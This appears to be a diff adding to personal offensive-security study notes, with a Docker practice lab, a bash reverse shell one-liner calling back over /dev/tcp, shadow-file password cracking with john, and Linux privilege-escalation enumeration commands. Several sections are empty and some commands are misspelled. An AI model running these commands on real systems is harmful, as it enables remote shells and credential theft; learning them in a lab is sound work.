@@ -297,9 +297,165 @@ ls
  hacked                                                        test5.gif
  test2.png
 
+
+```
 # REVERSE SHELLS
+```bash
+# Dockerfile
+FROM ubuntu:latest
+
+RUN apt-get update
+RUN apt-gwt install sudo ruby curl iproute2 php nano python3-pip openssh-server -y
+
+RUN echo "ubuntu:test" | chpasswd
+
+# Build container
+docker build -t reverse_lab .
+# Run container
+docker run -dit --name reverse_lab --rm reverse_lab
+# Exec container
+docker exec -it reverse_lab /bin/bash
+
+# BASH
+nc -nlvp 4321 # attacker machine
+bash -c "bash -i >& /dev/tcp/172.17.0.1/4321 0>&1" # victims machine (reverse shell payload)
+
+# we nedd to get the one liner payload for every language
+
+```
+# UNSHADOW ATTACK
+```bash
+# hashes
+echo "hello" | md5sum
+echo "hello" | sha256sum
+echo "hello" | sha512sum
+
+# CREATING HASHED PASS (SHA512CRYPT)
+openssl passwd -6 -salt -salt new-password # basecase
+openssl passwd -6 -salt 123 test_password
+# ans
+$6$123$oNCbPo4FUnLpCvgUBkAoucXzoUKjg9Pgl8anj/zCYSz2eE/fkyZOzpJdE8N/fR4nxj7e6Cp5LFPUkHDK59K/K0
+
+# CRACKING HASHES (rockyou.txt file)
+unshadow passwd shadow > unshadow
+john --format=crypt --wordlist=rockyou.txt unshadow
+
+
+```
+# SYSTEM ENUMERATION
+```bash
+# ENUMERATE
+- harware architecture
+- kernel version
+- linux distro version
+- users and groups (/etc/passwd)
+- access to powerful groups (docker, ...)
+- sudo configuration (sudo -l)
+- fs directories (/home/*, /opt/*, /var/www/html/*)
+- suid/guid binaries
+- local services
+- network interfaces
+- software installed with versions
+- backups/ saves session
+- repos under version control systems (git, svn)
+- cronjobs
+- capabilities
+
+# HARDWARE ARCH
+uname -a
+
+# KERNEL VERSION
+unanem -r
+
+# LINUX DISTRO
+lsb_release -a
+
+# ENVIROMENT VARIABLES
+env
+export ALO=/home/edibauer # add
+source ~/.zshrc
+
+echo $ALO
+
+unset ALO # delete
+
+# USERS
+cat /etc/passwd | cut -d ':' -f 1
+cat /etc/group | cut -d ':' -f 1
+
+# GROUPS
+groups
+
+# sudo
+sudo -l
+
+# DIRS
+ls -lha /opt
+ls -lha /home/*
+ls -lha /var/www/*
+
+# SUID/GUID BINS
+find / -perm -u=s 2>/dev/null
+find / -perm -g=s -type f 2>/dev/null
+
+# LOCAL SERV
+netstat -lpnt
+netstat -lpnu
+
+# NETWORK 
+ip a
+
+# SOFTWARE INSTALLED VERSIONS
+which <SOFTWARE>
+ls -lha /usr/local/sbin/*
+ls -lha /usr/local/bin/*
+ls -lha /usr/bin/*
+
+# BACKUPS
+find / -name ".bkp" -ls
+find / -name ".kdbx" -ls
+
+# REPOS
+git log
+git checkout a38597g498y239ag23842934
+git switch -
+
+# CRON
+
+# CAPABILITITES
+
+
+# AUTOMATED
+PEASS
+LinEnum
 
 
 
+```
+# CRONJOB ENUMERATION
+```bash
+
+
+```
+# CAPABILITITES ENUMERATION
+```bash
+
+
+```
+# LOCAL SERVICE EXPLOTATION
+```bash
+
+
+```
+# LINUX BINARY EXPLOTATION
+```bash
+
+
+```
+# LINUX KERNEL EXPLOTATION
+```bash
+# ENUM KERNEL VERSION
+uname -a
+lsb_release -a 
 
 ```
